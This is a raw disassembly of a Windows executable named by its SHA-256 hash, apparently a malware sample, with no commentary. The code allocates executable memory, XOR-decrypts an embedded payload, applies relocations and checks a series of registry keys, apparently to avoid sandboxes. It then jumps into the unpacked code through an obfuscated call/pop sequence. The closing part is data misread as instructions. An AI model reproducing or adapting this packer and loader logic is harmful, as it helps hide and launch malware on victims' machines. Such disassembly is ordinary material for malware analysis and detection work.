
34616544a302ba718b5c12e649a6a1e38ac9a3457cca78d93df5a0b2d0919af5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	pop    ebp
  401004:	ret    
  401005:	int3   
  401006:	int3   
  401007:	int3   
  401008:	int3   
  401009:	int3   
  40100a:	int3   
  40100b:	int3   
  40100c:	int3   
  40100d:	int3   
  40100e:	int3   
  40100f:	int3   
  401010:	push   ebp
  401011:	mov    ebp,esp
  401013:	push   ecx
  401014:	mov    DWORD PTR [ebp-0x4],0x1e4dc
  40101b:	push   0x40
  40101d:	push   0x3000
  401022:	mov    eax,DWORD PTR [ebp+0x8]
  401025:	push   eax
  401026:	push   0x0
  401028:	call   DWORD PTR ds:0x418324
  40102e:	mov    esp,ebp
  401030:	pop    ebp
  401031:	ret    
  401032:	int3   
  401033:	int3   
  401034:	int3   
  401035:	int3   
  401036:	int3   
  401037:	int3   
  401038:	int3   
  401039:	int3   
  40103a:	int3   
  40103b:	int3   
  40103c:	int3   
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	push   ebp
  401041:	mov    ebp,esp
  401043:	pop    ebp
  401044:	ret    
  401045:	int3   
  401046:	int3   
  401047:	int3   
  401048:	int3   
  401049:	int3   
  40104a:	int3   
  40104b:	int3   
  40104c:	int3   
  40104d:	int3   
  40104e:	int3   
  40104f:	int3   
  401050:	push   ebp
  401051:	mov    ebp,esp
  401053:	sub    esp,0x8
  401056:	mov    eax,DWORD PTR [ebp+0x8]
  401059:	mov    DWORD PTR [ebp-0x4],eax
  40105c:	mov    ecx,DWORD PTR [ebp+0xc]
  40105f:	mov    DWORD PTR [ebp-0x8],ecx
  401062:	mov    edx,DWORD PTR [ebp-0x4]
  401065:	cmp    edx,DWORD PTR [ebp-0x8]
  401068:	jae    0x401071
  40106a:	mov    eax,DWORD PTR [ebp-0x4]
  40106d:	jmp    0x401074
  40106f:	jmp    0x401074
  401071:	mov    eax,DWORD PTR [ebp-0x8]
  401074:	mov    esp,ebp
  401076:	pop    ebp
  401077:	ret    
  401078:	int3   
  401079:	int3   
  40107a:	int3   
  40107b:	int3   
  40107c:	int3   
  40107d:	int3   
  40107e:	int3   
  40107f:	int3   
  401080:	push   ebp
  401081:	mov    ebp,esp
  401083:	mov    DWORD PTR ds:0x418328,0x401820
  40108d:	pop    ebp
  40108e:	ret    
  40108f:	int3   
  401090:	push   ebp
  401091:	mov    ebp,esp
  401093:	mov    DWORD PTR ds:0x418328,0x4173f4
  40109d:	pop    ebp
  40109e:	ret    
  40109f:	int3   
  4010a0:	push   ebp
  4010a1:	mov    ebp,esp
  4010a3:	mov    eax,DWORD PTR [ebp+0x8]
  4010a6:	mov    eax,DWORD PTR [eax-0x4]
  4010a9:	pop    ebp
  4010aa:	ret    
  4010ab:	int3   
  4010ac:	int3   
  4010ad:	int3   
  4010ae:	int3   
  4010af:	int3   
  4010b0:	push   ebp
  4010b1:	mov    ebp,esp
  4010b3:	sub    esp,0xc
  4010b6:	mov    DWORD PTR [ebp-0x4],0x0
  4010bd:	jmp    0x4010c8
  4010bf:	mov    eax,DWORD PTR [ebp-0x4]
  4010c2:	add    eax,0x1
  4010c5:	mov    DWORD PTR [ebp-0x4],eax
  4010c8:	mov    ecx,DWORD PTR [ebp-0x4]
  4010cb:	cmp    ecx,DWORD PTR [ebp+0x8]
  4010ce:	jae    0x40111f
  4010d0:	mov    edx,DWORD PTR [ebp-0x4]
  4010d3:	mov    eax,DWORD PTR [ebp+0xc]
  4010d6:	movzx  ecx,WORD PTR [eax+edx*2]
  4010da:	sar    ecx,0xc
  4010dd:	cmp    ecx,0x3
  4010e0:	jne    0x40111d
  4010e2:	mov    DWORD PTR [ebp-0xc],0xfff
  4010e9:	mov    edx,DWORD PTR [ebp-0x4]
  4010ec:	mov    eax,DWORD PTR [ebp+0xc]
  4010ef:	movzx  ecx,WORD PTR [eax+edx*2]
  4010f3:	and    ecx,DWORD PTR [ebp-0xc]
  4010f6:	add    ecx,0x43
  4010f9:	mov    DWORD PTR [ebp-0x8],ecx
  4010fc:	mov    edx,DWORD PTR [ebp+0x18]
  4010ff:	mov    eax,DWORD PTR [ebp+0x10]
  401102:	add    eax,DWORD PTR [edx]
  401104:	mov    ecx,DWORD PTR [ebp-0x8]
  401107:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  40110b:	add    edx,DWORD PTR [ebp+0x14]
  40110e:	mov    eax,DWORD PTR [ebp+0x18]
  401111:	mov    ecx,DWORD PTR [ebp+0x10]
  401114:	add    ecx,DWORD PTR [eax]
  401116:	mov    eax,DWORD PTR [ebp-0x8]
  401119:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  40111d:	jmp    0x4010bf
  40111f:	mov    esp,ebp
  401121:	pop    ebp
  401122:	ret    
  401123:	int3   
  401124:	int3   
  401125:	int3   
  401126:	int3   
  401127:	int3   
  401128:	int3   
  401129:	int3   
  40112a:	int3   
  40112b:	int3   
  40112c:	int3   
  40112d:	int3   
  40112e:	int3   
  40112f:	int3   
  401130:	push   ebp
  401131:	mov    ebp,esp
  401133:	sub    esp,0x14
  401136:	mov    eax,DWORD PTR [ebp+0x8]
  401139:	cmp    DWORD PTR [eax+0x4],0x0
  40113d:	je     0x401187
  40113f:	mov    DWORD PTR [ebp-0x14],0x2a1
  401146:	mov    ecx,DWORD PTR [ebp+0x8]
  401149:	mov    edx,DWORD PTR [ecx+0x4]
  40114c:	sub    edx,0x8
  40114f:	shr    edx,1
  401151:	mov    DWORD PTR [ebp-0xc],edx
  401154:	mov    eax,DWORD PTR [ebp+0x8]
  401157:	add    eax,0x8
  40115a:	mov    DWORD PTR [ebp-0x10],eax
  40115d:	mov    ecx,DWORD PTR [ebp+0x8]
  401160:	push   ecx
  401161:	mov    edx,DWORD PTR [ebp+0x10]
  401164:	push   edx
  401165:	mov    eax,DWORD PTR [ebp+0xc]
  401168:	push   eax
  401169:	mov    ecx,DWORD PTR [ebp-0x10]
  40116c:	push   ecx
  40116d:	mov    edx,DWORD PTR [ebp-0xc]
  401170:	push   edx
  401171:	call   0x4010b0
  401176:	add    esp,0x14
  401179:	mov    eax,DWORD PTR [ebp+0x8]
  40117c:	mov    ecx,DWORD PTR [ebp+0x8]
  40117f:	add    ecx,DWORD PTR [eax+0x4]
  401182:	mov    DWORD PTR [ebp+0x8],ecx
  401185:	jmp    0x401136
  401187:	mov    esp,ebp
  401189:	pop    ebp
  40118a:	ret    
  40118b:	int3   
  40118c:	int3   
  40118d:	int3   
  40118e:	int3   
  40118f:	int3   
  401190:	push   ebp
  401191:	mov    ebp,esp
  401193:	sub    esp,0x20
  401196:	mov    DWORD PTR [ebp-0x8],0x37
  40119d:	mov    DWORD PTR [ebp-0x10],0x0
  4011a4:	jmp    0x4011af
  4011a6:	mov    eax,DWORD PTR [ebp-0x10]
  4011a9:	add    eax,0x4
  4011ac:	mov    DWORD PTR [ebp-0x10],eax
  4011af:	mov    ecx,DWORD PTR [ebp-0x10]
  4011b2:	cmp    ecx,DWORD PTR [ebp+0xc]
  4011b5:	jae    0x40125b
  4011bb:	mov    DWORD PTR [ebp-0x8],0x1425
  4011c2:	mov    DWORD PTR [ebp-0x8],0x37
  4011c9:	mov    edx,DWORD PTR [ebp-0x10]
  4011cc:	add    edx,0x1431
  4011d2:	mov    DWORD PTR ds:0x41832c,edx
  4011d8:	mov    eax,DWORD PTR [ebp+0x8]
  4011db:	add    eax,DWORD PTR [ebp-0x10]
  4011de:	mov    ecx,DWORD PTR [eax]
  4011e0:	add    ecx,DWORD PTR [ebp-0x10]
  4011e3:	mov    edx,DWORD PTR [ebp+0x8]
  4011e6:	add    edx,DWORD PTR [ebp-0x10]
  4011e9:	mov    DWORD PTR [edx],ecx
  4011eb:	mov    eax,DWORD PTR [ebp-0xc]
  4011ee:	mov    DWORD PTR [ebp-0x14],eax
  4011f1:	mov    DWORD PTR [ebp-0x8],0x1425
  4011f8:	mov    ecx,DWORD PTR ds:0x41832c
  4011fe:	mov    DWORD PTR [ebp-0x20],ecx
  401201:	mov    edx,DWORD PTR [ebp-0x20]
  401204:	mov    DWORD PTR [ebp-0x1c],edx
  401207:	mov    eax,DWORD PTR [ebp-0x1c]
  40120a:	mov    DWORD PTR [ebp-0x18],eax
  40120d:	cmp    DWORD PTR [ebp-0x10],0x0
  401211:	jne    0x401243
  401213:	push   0x0
  401215:	push   0x80
  40121a:	push   0x3
  40121c:	push   0x0
  40121e:	push   0x3
  401220:	push   0x1
  401222:	push   0x418330
  401227:	call   DWORD PTR ds:0x418214
  40122d:	mov    DWORD PTR [ebp-0x4],eax
  401230:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  401234:	je     0x40123c
  401236:	cmp    DWORD PTR [ebp-0x4],0x0
  40123a:	jne    0x401243
  40123c:	mov    eax,0x42
  401241:	jmp    0x40125b
  401243:	mov    ecx,DWORD PTR [ebp+0x8]
  401246:	add    ecx,DWORD PTR [ebp-0x10]
  401249:	mov    edx,DWORD PTR [ecx]
  40124b:	xor    edx,DWORD PTR [ebp-0x18]
  40124e:	mov    eax,DWORD PTR [ebp+0x8]
  401251:	add    eax,DWORD PTR [ebp-0x10]
  401254:	mov    DWORD PTR [eax],edx
  401256:	jmp    0x4011a6
  40125b:	mov    esp,ebp
  40125d:	pop    ebp
  40125e:	ret    
  40125f:	int3   
  401260:	push   ebp
  401261:	mov    ebp,esp
  401263:	xor    eax,eax
  401265:	pop    ebp
  401266:	ret    0x10
  401269:	int3   
  40126a:	int3   
  40126b:	int3   
  40126c:	int3   
  40126d:	int3   
  40126e:	int3   
  40126f:	int3   
  401270:	push   ebp
  401271:	mov    ebp,esp
  401273:	sub    esp,0x2c0
  401279:	pusha  
  40127a:	mov    DWORD PTR ds:0x418434,ebp
  401280:	mov    DWORD PTR [ebp-0x294],0x0
  40128a:	mov    DWORD PTR [ebp-0x2a8],0x418074
  401294:	mov    DWORD PTR [ebp-0x2ac],0x418080
  40129e:	push   0x0
  4012a0:	call   DWORD PTR ds:0x418230
  4012a6:	mov    DWORD PTR [ebp-0x22c],eax
  4012ac:	cmp    DWORD PTR [ebp-0x22c],0x0
  4012b3:	jne    0x4012bc
  4012b5:	xor    eax,eax
  4012b7:	jmp    0x401816
  4012bc:	mov    eax,DWORD PTR [ebp-0x2a8]
  4012c2:	mov    BYTE PTR [eax],0x61
  4012c5:	mov    ecx,DWORD PTR [ebp-0x2ac]
  4012cb:	mov    BYTE PTR [ecx],0x52
  4012ce:	mov    edx,DWORD PTR [ebp-0x2ac]
  4012d4:	push   edx
  4012d5:	mov    eax,DWORD PTR [ebp-0x2a8]
  4012db:	push   eax
  4012dc:	call   DWORD PTR ds:0x418218
  4012e2:	push   eax
  4012e3:	call   DWORD PTR ds:0x41821c
  4012e9:	mov    DWORD PTR [ebp-0x27c],eax
  4012ef:	lea    ecx,[ebp-0x258]
  4012f5:	push   ecx
  4012f6:	push   0x20019
  4012fb:	push   0x0
  4012fd:	push   0x418310
  401302:	push   0x80000002
  401307:	call   DWORD PTR [ebp-0x27c]
  40130d:	test   eax,eax
  40130f:	je     0x401318
  401311:	xor    eax,eax
  401313:	jmp    0x401816
  401318:	lea    edx,[ebp-0x258]
  40131e:	push   edx
  40131f:	push   0x20019
  401324:	push   0x0
  401326:	push   0x418090
  40132b:	mov    eax,DWORD PTR [ebp-0x258]
  401331:	push   eax
  401332:	call   DWORD PTR [ebp-0x27c]
  401338:	test   eax,eax
  40133a:	je     0x401343
  40133c:	xor    eax,eax
  40133e:	jmp    0x401816
  401343:	lea    ecx,[ebp-0x258]
  401349:	push   ecx
  40134a:	push   0x20019
  40134f:	push   0x0
  401351:	push   0x4180a4
  401356:	mov    edx,DWORD PTR [ebp-0x258]
  40135c:	push   edx
  40135d:	call   DWORD PTR [ebp-0x27c]
  401363:	test   eax,eax
  401365:	je     0x40136e
  401367:	xor    eax,eax
  401369:	jmp    0x401816
  40136e:	lea    eax,[ebp-0x258]
  401374:	push   eax
  401375:	push   0x20019
  40137a:	push   0x0
  40137c:	push   0x4180b4
  401381:	mov    ecx,DWORD PTR [ebp-0x258]
  401387:	push   ecx
  401388:	call   DWORD PTR [ebp-0x27c]
  40138e:	test   eax,eax
  401390:	je     0x401399
  401392:	xor    eax,eax
  401394:	jmp    0x401816
  401399:	lea    edx,[ebp-0x258]
  40139f:	push   edx
  4013a0:	push   0x20019
  4013a5:	push   0x0
  4013a7:	push   0x418314
  4013ac:	mov    eax,DWORD PTR [ebp-0x258]
  4013b2:	push   eax
  4013b3:	call   DWORD PTR [ebp-0x27c]
  4013b9:	test   eax,eax
  4013bb:	je     0x4013c4
  4013bd:	xor    eax,eax
  4013bf:	jmp    0x401816
  4013c4:	lea    ecx,[ebp-0x258]
  4013ca:	push   ecx
  4013cb:	push   0x20019
  4013d0:	push   0x0
  4013d2:	push   0x418318
  4013d7:	mov    edx,DWORD PTR [ebp-0x258]
  4013dd:	push   edx
  4013de:	call   DWORD PTR [ebp-0x27c]
  4013e4:	test   eax,eax
  4013e6:	je     0x4013ef
  4013e8:	xor    eax,eax
  4013ea:	jmp    0x401816
  4013ef:	lea    eax,[ebp-0x258]
  4013f5:	push   eax
  4013f6:	push   0x20019
  4013fb:	push   0x0
  4013fd:	push   0x41831c
  401402:	mov    ecx,DWORD PTR [ebp-0x258]
  401408:	push   ecx
  401409:	call   DWORD PTR [ebp-0x27c]
  40140f:	test   eax,eax
  401411:	je     0x40141a
  401413:	xor    eax,eax
  401415:	jmp    0x401816
  40141a:	lea    edx,[ebp-0x258]
  401420:	push   edx
  401421:	push   0x20019
  401426:	push   0x0
  401428:	push   0x4180c0
  40142d:	mov    eax,DWORD PTR [ebp-0x258]
  401433:	push   eax
  401434:	call   DWORD PTR [ebp-0x27c]
  40143a:	test   eax,eax
  40143c:	je     0x401452
  40143e:	push   0x104
  401443:	push   0x5
  401445:	call   DWORD PTR ds:0x418220
  40144b:	xor    eax,eax
  40144d:	jmp    0x401816
  401452:	lea    ecx,[ebp-0x258]
  401458:	push   ecx
  401459:	push   0x20019
  40145e:	push   0x0
  401460:	push   0x418320
  401465:	mov    edx,DWORD PTR [ebp-0x258]
  40146b:	push   edx
  40146c:	call   DWORD PTR [ebp-0x27c]
  401472:	test   eax,eax
  401474:	je     0x40147d
  401476:	xor    eax,eax
  401478:	jmp    0x401816
  40147d:	lea    eax,[ebp-0x258]
  401483:	push   eax
  401484:	push   0x20019
  401489:	push   0x0
  40148b:	push   0x418110
  401490:	mov    ecx,DWORD PTR [ebp-0x258]
  401496:	push   ecx
  401497:	call   DWORD PTR [ebp-0x27c]
  40149d:	test   eax,eax
  40149f:	je     0x4014a8
  4014a1:	xor    eax,eax
  4014a3:	jmp    0x401816
  4014a8:	lea    edx,[ebp-0x258]
  4014ae:	push   edx
  4014af:	push   0x20019
  4014b4:	push   0x0
  4014b6:	push   0x418120
  4014bb:	mov    eax,DWORD PTR [ebp-0x258]
  4014c1:	push   eax
  4014c2:	call   DWORD PTR [ebp-0x27c]
  4014c8:	test   eax,eax
  4014ca:	jne    0x4014d3
  4014cc:	xor    eax,eax
  4014ce:	jmp    0x401816
  4014d3:	mov    DWORD PTR [ebp-0x214],0x0
  4014dd:	mov    DWORD PTR [ebp-0x288],0x64
  4014e7:	mov    DWORD PTR [ebp-0x21c],0x2
  4014f1:	mov    DWORD PTR [ebp-0x294],0x0
  4014fb:	mov    DWORD PTR [ebp-0x254],0x0
  401505:	mov    DWORD PTR [ebp-0x2ac],0x1
  40150f:	mov    DWORD PTR [ebp-0x218],0x3
  401519:	push   0x104
  40151e:	push   0x418330
  401523:	call   DWORD PTR ds:0x418220
  401529:	push   0x418134
  40152e:	push   0x418330
  401533:	call   DWORD PTR ds:0x418224
  401539:	push   0x41814c
  40153e:	push   0x41815c
  401543:	call   DWORD PTR ds:0x418228
  401549:	push   eax
  40154a:	call   DWORD PTR ds:0x41821c
  401550:	mov    ds:0x418324,eax
  401555:	call   0x401080
  40155a:	mov    ecx,DWORD PTR ds:0x418328
  401560:	push   ecx
  401561:	call   0x4010a0
  401566:	add    esp,0x4
  401569:	mov    DWORD PTR [ebp-0x298],eax
  40156f:	mov    edx,DWORD PTR [ebp-0x298]
  401575:	push   edx
  401576:	call   0x401010
  40157b:	add    esp,0x4
  40157e:	mov    DWORD PTR [ebp-0x290],eax
  401584:	mov    eax,DWORD PTR [ebp-0x298]
  40158a:	push   eax
  40158b:	push   0x0
  40158d:	mov    ecx,DWORD PTR [ebp-0x290]
  401593:	push   ecx
  401594:	call   0x401040
  401599:	add    esp,0xc
  40159c:	mov    edx,DWORD PTR [ebp-0x298]
  4015a2:	mov    DWORD PTR [ebp-0x2a0],edx
  4015a8:	mov    eax,DWORD PTR [ebp-0x294]
  4015ae:	cmp    eax,DWORD PTR [ebp-0x298]
  4015b4:	jae    0x401640
  4015ba:	mov    ecx,DWORD PTR [ebp-0x2a0]
  4015c0:	push   ecx
  4015c1:	mov    edx,DWORD PTR [ebp-0x288]
  4015c7:	push   edx
  4015c8:	call   0x401050
  4015cd:	add    esp,0x8
  4015d0:	mov    DWORD PTR [ebp-0x2a4],eax
  4015d6:	mov    eax,DWORD PTR [ebp-0x2a4]
  4015dc:	push   eax
  4015dd:	mov    ecx,DWORD PTR ds:0x418328
  4015e3:	add    ecx,DWORD PTR [ebp-0x254]
  4015e9:	push   ecx
  4015ea:	mov    edx,DWORD PTR [ebp-0x290]
  4015f0:	add    edx,DWORD PTR [ebp-0x294]
  4015f6:	push   edx
  4015f7:	call   0x417628
  4015fc:	add    esp,0xc
  4015ff:	mov    eax,DWORD PTR [ebp-0x21c]
  401605:	add    eax,DWORD PTR [ebp-0x288]
  40160b:	add    eax,DWORD PTR [ebp-0x254]
  401611:	mov    DWORD PTR [ebp-0x254],eax
  401617:	mov    ecx,DWORD PTR [ebp-0x294]
  40161d:	add    ecx,DWORD PTR [ebp-0x288]
  401623:	mov    DWORD PTR [ebp-0x294],ecx
  401629:	mov    edx,DWORD PTR [ebp-0x2a0]
  40162f:	sub    edx,DWORD PTR [ebp-0x2a4]
  401635:	mov    DWORD PTR [ebp-0x2a0],edx
  40163b:	jmp    0x4015a8
  401640:	mov    eax,DWORD PTR [ebp-0x298]
  401646:	push   eax
  401647:	mov    ecx,DWORD PTR [ebp-0x290]
  40164d:	push   ecx
  40164e:	call   0x401190
  401653:	add    esp,0x8
  401656:	mov    DWORD PTR [ebp-0x254],0x0
  401660:	mov    DWORD PTR [ebp-0x2b0],0x0
  40166a:	call   0x401090
  40166f:	mov    edx,DWORD PTR ds:0x418328
  401675:	push   edx
  401676:	call   0x4010a0
  40167b:	add    esp,0x4
  40167e:	mov    DWORD PTR [ebp-0x2b4],eax
  401684:	mov    eax,DWORD PTR [ebp-0x2b4]
  40168a:	push   eax
  40168b:	call   0x401010
  401690:	add    esp,0x4
  401693:	mov    DWORD PTR [ebp-0x250],eax
  401699:	mov    ecx,DWORD PTR [ebp-0x2b4]
  40169f:	push   ecx
  4016a0:	push   0x0
  4016a2:	mov    edx,DWORD PTR [ebp-0x250]
  4016a8:	push   edx
  4016a9:	call   0x401040
  4016ae:	add    esp,0xc
  4016b1:	mov    eax,DWORD PTR [ebp-0x2b4]
  4016b7:	mov    DWORD PTR [ebp-0x2bc],eax
  4016bd:	mov    ecx,DWORD PTR [ebp-0x2b0]
  4016c3:	cmp    ecx,DWORD PTR [ebp-0x2b4]
  4016c9:	jae    0x401755
  4016cf:	mov    edx,DWORD PTR [ebp-0x2bc]
  4016d5:	push   edx
  4016d6:	mov    eax,DWORD PTR [ebp-0x288]
  4016dc:	push   eax
  4016dd:	call   0x401050
  4016e2:	add    esp,0x8
  4016e5:	mov    DWORD PTR [ebp-0x2c0],eax
  4016eb:	mov    ecx,DWORD PTR [ebp-0x2c0]
  4016f1:	push   ecx
  4016f2:	mov    edx,DWORD PTR ds:0x418328
  4016f8:	add    edx,DWORD PTR [ebp-0x254]
  4016fe:	push   edx
  4016ff:	mov    eax,DWORD PTR [ebp-0x250]
  401705:	add    eax,DWORD PTR [ebp-0x2b0]
  40170b:	push   eax
  40170c:	call   0x417628
  401711:	add    esp,0xc
  401714:	mov    ecx,DWORD PTR [ebp-0x21c]
  40171a:	add    ecx,DWORD PTR [ebp-0x288]
  401720:	add    ecx,DWORD PTR [ebp-0x254]
  401726:	mov    DWORD PTR [ebp-0x254],ecx
  40172c:	mov    edx,DWORD PTR [ebp-0x2b0]
  401732:	add    edx,DWORD PTR [ebp-0x288]
  401738:	mov    DWORD PTR [ebp-0x2b0],edx
  40173e:	mov    eax,DWORD PTR [ebp-0x2bc]
  401744:	sub    eax,DWORD PTR [ebp-0x2c0]
  40174a:	mov    DWORD PTR [ebp-0x2bc],eax
  401750:	jmp    0x4016bd
  401755:	mov    ecx,DWORD PTR [ebp-0x2b4]
  40175b:	push   ecx
  40175c:	mov    edx,DWORD PTR [ebp-0x250]
  401762:	push   edx
  401763:	call   0x401190
  401768:	add    esp,0x8
  40176b:	mov    eax,DWORD PTR [ebp-0x290]
  401771:	mov    ecx,DWORD PTR [ebp-0x250]
  401777:	mov    DWORD PTR [eax],ecx
  401779:	push   0x17000
  40177e:	call   0x401010
  401783:	add    esp,0x4
  401786:	mov    DWORD PTR [ebp-0x4],eax
  401789:	lea    edx,[ebp-0x258]
  40178f:	push   edx
  401790:	push   0x20019
  401795:	push   0x0
  401797:	push   0x418168
  40179c:	push   0x80000002
  4017a1:	call   DWORD PTR ds:0x418240
  4017a7:	test   eax,eax
  4017a9:	je     0x4017af
  4017ab:	xor    eax,eax
  4017ad:	jmp    0x401816
  4017af:	push   0x15500
  4017b4:	mov    eax,DWORD PTR [ebp-0x290]
  4017ba:	push   eax
  4017bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4017be:	add    ecx,0x200
  4017c4:	push   ecx
  4017c5:	call   0x417628
  4017ca:	add    esp,0xc
  4017cd:	mov    edx,DWORD PTR [ebp-0x4]
  4017d0:	sub    edx,0x400000
  4017d6:	push   edx
  4017d7:	mov    eax,DWORD PTR [ebp-0x4]
  4017da:	push   eax
  4017db:	mov    ecx,DWORD PTR [ebp-0x250]
  4017e1:	push   ecx
  4017e2:	call   0x401130
  4017e7:	add    esp,0xc
  4017ea:	mov    esp,DWORD PTR ds:0x418434
  4017f0:	pop    ecx
  4017f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4017f4:	add    ecx,0x15350
  4017fa:	mov    edx,ecx
  4017fc:	call   0x401801
  401801:	pop    eax
  401802:	call   0x401807
  401807:	pop    eax
  401808:	call   0x40180d
  40180d:	pop    eax
  40180e:	call   0x401813
  401813:	pop    eax
  401814:	jmp    edx
  401816:	mov    esp,ebp
  401818:	pop    ebp
  401819:	ret    
  40181a:	int3   
  40181b:	int3   
  40181c:	add    BYTE PTR [ebp+0x1],dl
  40181f:	add    BYTE PTR [ecx],dh
  401821:	inc    ebx
  401822:	inc    ecx
  401823:	add    BYTE PTR [esi+0x71],ch
  401826:	je     0x401878
  401828:	inc    ebx
  401829:	jnp    0x40188e
  40182b:	inc    ecx
  40182c:	dec    ebp
  40182d:	jo     0x4018a1
  40182f:	and    ah,BYTE PTR gs:[edi+0x0]
  401833:	add    ch,dh
  401835:	jp     0x401898
  401837:	fs in  eax,dx
  401839:	jl     0x40189d
  40183b:	jb     0x40184d
  40183d:	data16 jns 0x401885
  401840:	or     DWORD PTR [ebp+0x0],edx
  401843:	add    ch,dh
  401845:	jp     0x4018a8
  401847:	fs in  eax,dx
  401849:	jl     0x4018ad
  40184b:	jb     0x40185d
  40184d:	data16 jns 0x401895
  401850:	jmp    0xee401897
  401855:	jo     0x4018cb
  401857:	dec    ebp
  401858:	into   
  401859:	outs   dx,DWORD PTR ds:[esi]
  40185a:	jne    0x4018c8
  40185c:	int3   
  40185d:	pop    ebx
  40185e:	popa   
  40185f:	outs   dx,BYTE PTR ds:[esi]
  401860:	aad    0x77
  401862:	gs inc ecx
  401864:	xor    DWORD PTR [eax+eax*1],edx
  401867:	add    dl,dh
  401869:	gs gs popa 
  40186c:	mov    ebp,0x9d694670
  401871:	jno    0x4018b4
  401873:	add    BYTE PTR [ebp-0x6d8d8b99],dl
  401879:	jne    0x4018ef
  40187b:	inc    ecx
  40187c:	xor    DWORD PTR [eax+eax*1],edx
  40187f:	add    BYTE PTR [esi+0x71],dh
  401882:	je     0x4018db
  401884:	add    BYTE PTR [eax],al
  401886:	cwde   
  401887:	jp     0x4018ed
  401889:	outs   dx,DWORD PTR ds:[esi]
  40188a:	xchg   BYTE PTR [edi+0x44],ah
  40188d:	imul   eax,DWORD PTR [ebx+0x5e746371],0x31417966
  401897:	adc    al,0x0
  401899:	add    BYTE PTR [esi+0x71],dh
  40189c:	je     0x4018eb
  40189e:	inc    esi
  40189f:	jo     0x401916
  4018a1:	ins    BYTE PTR es:[edi],dx
  4018a2:	push   esp
  4018a3:	pop    esp
  4018a4:	popa   
  4018a5:	outs   dx,BYTE PTR ds:[esi]
  4018a6:	dec    ebp
  4018a7:	js     0x40190e
  4018a9:	push   edi
  4018aa:	xor    DWORD PTR [eax+eax*1],edx
  4018ad:	add    BYTE PTR ds:0x45004016,ch
  4018b3:	push   ss
  4018b4:	inc    eax
  4018b5:	add    BYTE PTR [ebp+0x16],cl
  4018b8:	inc    eax
  4018b9:	add    BYTE PTR [ebp+0x16],ah
  4018bc:	inc    eax
  4018bd:	add    cl,ch
  4018bf:	adc    eax,0x15e50040
  4018c4:	inc    eax
  4018c5:	add    BYTE PTR [ecx],dl
  4018c7:	push   ss
  4018c8:	inc    eax
  4018c9:	add    cl,bh
  4018cb:	adc    eax,0x70ee0040
  4018d0:	je     0x401922
  4018d2:	jecxz  0x40194e
  4018d4:	arpl   WORD PTR [ecx-0x33],ax
  4018d7:	outs   dx,DWORD PTR ds:[esi]
  4018d8:	jb     0x40193f
  4018da:	loop   0x401942
  4018dc:	add    BYTE PTR [eax],al
  4018de:	in     eax,0x7a
  4018e0:	popa   
  4018e1:	fs std 
  4018e3:	jl     0x401947
  4018e5:	jb     0x4018b7
  4018e7:	gs jns 0x40192f
  4018ea:	add    BYTE PTR [eax],al
  4018ec:	mov    ecx,0xca000054
  4018f1:	jo     0x401965
  4018f3:	outs   dx,BYTE PTR ds:[esi]
  4018f4:	xchg   esp,eax
  4018f5:	js     0x40192a
  4018f7:	xor    dl,BYTE PTR [edi+0x70]
  4018fa:	ins    BYTE PTR es:[edi],dx
  4018fb:	ins    BYTE PTR es:[edi],dx
  4018fc:	xor    DWORD PTR [eax+eax*1],edx
  4018ff:	add    BYTE PTR [ebp+eiz*2+0x60836376],al
  401906:	cs fs xchg ebp,eax
  401909:	js     0x40190b
  40190b:	add    BYTE PTR [edi+ebp*2+0x608c736d],cl
  401912:	add    BYTE PTR [eax],al
  401914:	pop    esp
  401915:	gs jbe 0x40197b
  401918:	arpl   WORD PTR [eax+0x2e],sp
  40191b:	fs dec ebp
  40191d:	js     0x40191f
  40191f:	add    BYTE PTR [edi+ebp*2+0x6d],al
  401923:	arpl   WORD PTR [ecx+0x6b],ax
  401926:	add    BYTE PTR [eax],al
  401928:	pop    edi
  401929:	jnp    0x40199d
  40192b:	je     0x401971
  40192d:	jae    0x40199b
  40192f:	inc    ecx
  401930:	inc    ebp
  401931:	js     0x4019a2
  401933:	arpl   WORD PTR [ecx],si
  401935:	adc    al,0x0
  401937:	add    bh,bh
  401939:	jp     0x4019ad
  40193b:	je     0x401961
  40193d:	jae    0x4019ab
  40193f:	inc    ecx
  401940:	add    eax,0x31636f78
  401945:	adc    al,0x0
  401947:	add    ah,bl
  401949:	jns    0x4019b8
  40194b:	popa   
  40194c:	add    DWORD PTR [edx+0x69],eax
  40194f:	add    BYTE PTR gs:[eax],al
  401952:	(bad)  
  401953:	pop    eax
  401954:	inc    si
  401956:	fdiv   DWORD PTR [edi+0x65]
  401959:	add    bh,bh
  40195b:	jp     0x4019cf
  40195d:	je     0x401943
  40195f:	jb     0x4019cd
  401961:	push   eax
  401962:	jecxz  0x4019dc
  401964:	je     0x4019cb
  401966:	rcr    BYTE PTR [edi+0x0],cl
  401969:	add    cl,bh
  40196b:	outs   dx,BYTE PTR ds:[esi]
  40196c:	popa   
  40196d:	jo     0x40195f
  40196f:	ja     0x4019dd
  401971:	outs   dx,DWORD PTR ds:[esi]
  401972:	rcl    BYTE PTR [ebx],cl
  401974:	add    BYTE PTR [eax],al
  401976:	call   0x3378:0x8c6e726f
  40197d:	xor    cl,BYTE PTR [edi+0x70]
  401980:	ins    BYTE PTR es:[edi],dx
  401981:	ins    BYTE PTR es:[edi],dx
  401982:	xor    DWORD PTR [eax+eax*1],edx
  401985:	add    BYTE PTR [esi+0x6f],dh
  401988:	je     0x4019da
  40198a:	cmp    DWORD PTR [ecx+0x63],0x65
  40198e:	and    BYTE PTR [ebp+0x48],0x65
  401992:	nop
  401993:	add    BYTE PTR fs:[eax],al
  401996:	xor    DWORD PTR [esp+eax*2],edx
  401999:	add    DWORD PTR [ecx],esi
  40199b:	mov    al,0x59
  40199d:	nop
  40199e:	xor    esi,edi
  4019a0:	add    eax,DWORD PTR [eax]
  4019a2:	xor    edi,esi
  4019a4:	add    eax,DWORD PTR [eax]
  4019a6:	xor    edx,ebp
  4019a8:	sti    
  4019a9:	add    BYTE PTR [ecx],dh
  4019ab:	and    eax,DWORD PTR [ebx]
  4019ad:	add    BYTE PTR [ecx],dh
  4019af:	sti    
  4019b0:	add    eax,DWORD PTR [eax]
  4019b2:	xor    DWORD PTR [ebx],edi
  4019b4:	add    al,0x0
  4019b6:	add    BYTE PTR [eax],al
  4019b8:	xor    ebx,edi
